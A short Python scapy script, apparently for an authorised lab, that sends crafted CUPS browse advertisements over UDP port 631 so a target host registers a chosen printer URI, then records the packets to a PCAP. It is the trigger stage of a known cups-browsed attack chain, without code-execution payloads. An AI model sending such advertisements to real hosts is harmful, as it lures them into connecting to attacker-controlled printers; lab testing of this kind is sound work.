#!/usr/bin/env python3
"""Benign CUPS legacy-browse metadata test for an isolated authorised lab.
No print jobs, PPD payloads, shell commands, or remote-code-execution attempt.
"""
import argparse, logging, time
from pathlib import Path
from scapy.all import IP, UDP, Raw, send, wrpcap

def main():
    p = argparse.ArgumentParser(description="Send benign CUPS browse metadata to an authorised lab target")
    p.add_argument("--target", required=True, help="CUPS host reachable from Kali, e.g. 10.0.2.2")
    p.add_argument("--printer-uri", required=True, help="Lab printer URI, e.g. ipp://172.19.0.3:8631/ipp/print")
    p.add_argument("--port", type=int, default=631)
    p.add_argument("--count", type=int, choices=(1,2,3), default=3)
    p.add_argument("--delay", type=float, default=1.0)
    p.add_argument("--pcap", default="pcap_files/crafted_browse_tests.pcap")
    p.add_argument("--log", default="logs/cups_attack.log")
    a = p.parse_args()
    Path(a.pcap).parent.mkdir(parents=True, exist_ok=True)
    Path(a.log).parent.mkdir(parents=True, exist_ok=True)
    logging.basicConfig(filename=a.log, level=logging.INFO,
                        format="%(asctime)s %(levelname)s %(message)s")
    variants = [
        ("00 03", a.printer_uri, "Lab-A", "Scapy test printer A"),
        ("00 03", a.printer_uri, "Lab-B", "Scapy test printer B"),
        ("00 03", a.printer_uri, "Lab-C", "Scapy test printer C"),
    ]
    packets = []
    for i, (kind, uri, location, info) in enumerate(variants[:a.count], 1):
        payload = f'{kind} {uri} "{location}" "{info}"'.encode()
        pkt = IP(dst=a.target)/UDP(dport=a.port)/Raw(load=payload)
        packets.append(pkt)
        logging.info("Sending variation %d to %s:%d payload=%r", i, a.target, a.port, payload)
        print(f"[{i}/{a.count}] Sending benign browse metadata to {a.target}:{a.port}")
        send(pkt, verbose=False)
        if i < a.count:
            time.sleep(a.delay)
    wrpcap(a.pcap, packets)
    logging.info("Saved PCAP: %s", a.pcap)
    print(f"[+] PCAP saved: {a.pcap}")
    print(f"[+] Log saved: {a.log}")
    print("[!] UDP transmission alone does not prove CUPS accepted the advertisement.")
    print("[!] Verify a victim-initiated TCP connection to the virtual printer.")

if __name__ == "__main__":
    main()
